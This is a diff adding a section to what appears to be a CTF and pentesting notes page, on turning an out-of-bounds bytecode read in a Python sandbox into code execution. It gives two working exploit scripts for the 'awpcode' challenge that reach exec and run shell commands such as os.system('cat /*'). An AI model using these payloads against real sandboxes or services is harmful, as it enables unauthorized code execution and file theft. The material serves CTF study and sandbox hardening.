@@ -228,3 +228,93 @@ a().cr_frame.f_globals
 # This is just an example
 (lambda x:x).__class__((lambda a,b,c: [a,b,c]).__code__.replace(co_code=b'\x97\x00|\x11|\x11|\x40g\x03S\x00', co_argcount=0, co_nlocals=0, co_varnames=()), {})()[-1].__globals__["sys"].modules["os"].system("ls")
 ```
+
+### Bytecode2RCE exploiting OOB READ with LOAD_FAST
+
+Let's say you have something similar to this (`B01lers CTF - awpcode`):
+
+```py
+from types import CodeType
+def x():pass
+x.__code__ = CodeType(0,0,0,0,0,0,bytes.fromhex(input(">>> ")[:176]),(),(),(),'Δ','♦','✉︎',0,bytes(),bytes(),(),())
+a = x()
+```
+
+Then, this can be exploited in two different ways:
+
+## V1
+```py
+# From https://blog.neilhommes.xyz/docs/Writeups/2024/bctf.html#awpcode---hard
+
+import dis
+
+def assemble(ops):
+    cache = bytes([dis.opmap["CACHE"], 0])
+    ret = b""
+    for op, arg in ops:
+        opc = dis.opmap[op]
+        ret += bytes([opc, arg])
+        ret += cache * dis._inline_cache_entries[opc]
+    return ret
+
+co_code = assemble(
+    [
+        ("RESUME", 0),
+        ("LOAD_CONST", 115),
+        ("UNPACK_EX", 29),
+        ("BUILD_TUPLE", 28),
+        ("POP_TOP", 0),
+        ("SWAP", 2),
+        ("POP_TOP", 0),
+        ("LOAD_CONST", 115),
+        ("SWAP", 2),
+        ("BINARY_SUBSCR", 0),
+        ("COPY", 1),
+        ("CALL", 0),    # input
+        
+        ("LOAD_CONST", 115),
+        ("UNPACK_EX", 21),
+        ("BUILD_TUPLE", 20),
+        ("POP_TOP", 0),
+        ("SWAP", 2),
+        ("POP_TOP", 0),
+        ("LOAD_CONST", 115),
+        ("SWAP", 2),
+        ("BINARY_SUBSCR", 0),
+        ("SWAP", 2),
+        ("CALL", 0),    # exec
+        
+        ("RETURN_VALUE", 0),
+    ]
+)
+print(co_code.hex())
+
+```
+
+## V2
+This is only possible if the input is cut before being passed to `bytes.fromhex` (for example)
+
+```py
+from pwn import *
+from opcode import opmap
+
+
+co_code = bytes([
+                 opmap["KW_NAMES"], 0,
+                 opmap["RESUME"], 0,
+                 opmap["PUSH_NULL"], 0,
+                 opmap["LOAD_FAST"], 82, # exec
+                 opmap["LOAD_FAST"], 6, # my input
+                 opmap["PRECALL"], 1,
+                 opmap["CACHE"],
+                 opmap["CACHE"],
+                 opmap["CALL"], 1,
+                 opmap["CACHE"],
+                 opmap["CACHE"],
+])
+
+
+payload = co_code.ljust(176, b"B") # add padding util the input limit is reached
+print(payload.hex().encode() + b" if __import__('os').system('cat /*') else 0")
+
+```
